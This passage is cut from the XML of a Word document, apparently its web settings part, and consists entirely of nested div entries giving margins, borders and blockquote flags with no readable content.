                                            <w:div w:id="2008827255">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="757361037">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1016464122">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="318074503">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1271202817">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1541360531">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1684354808">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="724530735">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1447195617">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="422411617">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="812064819">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="657735956">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1636986417">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="337776732">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="152919607">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="744109088">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1258952161">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1494372413">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="690880519">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1750813206">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="486408999">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1439645421">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1276984827">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="485123631">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1752462791">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="560138069">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="104469157">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1445462833">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1100220036">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="160043932">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="222259184">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1549759275">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="343870238">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1606108462">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="141774383">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="945816358">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="2018846073">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1377119930">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="626937616">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="667559893">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="929896351">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="212231949">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1949268574">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1823497059">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="3445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9303">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="300"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="613101240">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1567300379">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="35861497">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1887403965">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="150"/>
                                              <w:marBottom w:val="150"/>
                                              <w:divBdr>
                                                <w:top w:val="dashed" w:sz="6" w:space="8" w:color="C0C0C0"/>
                                                <w:left w:val="dashed" w:sz="6" w:space="0" w:color="C0C0C0"/>
                                                <w:bottom w:val="dashed" w:sz="6" w:space="8" w:color="C0C0C0"/>
                                                <w:right w:val="dashed" w:sz="6" w:space="0" w:color="C0C0C0"/>
                                              </w:divBdr>
                                            </w:div>
                                            <w:div w:id="307250038">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="150"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="2132241085">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="779106404">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="1977294700">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
